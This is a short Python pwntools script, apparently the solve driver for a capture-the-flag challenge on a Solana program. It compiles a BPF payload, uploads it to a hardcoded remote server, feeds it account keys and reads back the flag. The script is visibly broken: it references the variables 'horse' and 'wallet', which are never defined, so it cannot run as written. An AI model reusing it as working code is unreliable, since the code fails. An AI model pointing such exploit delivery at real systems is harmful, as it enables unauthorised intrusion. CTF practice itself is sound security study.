import os
os.system('cargo build-bpf')

from pwn import args, remote
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or '34.70.105.227'
port = args.PORT or 8080

r = remote(host, port)
solve = open('./framework-solve/solve/target/deploy/solve.so', 'rb').read()
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(r.recvline().strip().decode())
print('program', program)
r.recvuntil(b'user: ')
user = PublicKey(r.recvline().strip().decode())
print('user', user)

print("after base input")

r.sendline(b'5')
r.sendline(b'x ' + program.to_base58())
r.sendline(b'ws ' + user.to_base58())
r.sendline(b'w ' + horse.to_base58())
r.sendline(b'w ' + wallet.to_base58())
r.sendline(b'x ' + SYS_PROGRAM_ID.to_base58())

r.sendline(b'0')

r.recvuntil(b'Flag: ')
r.stream()
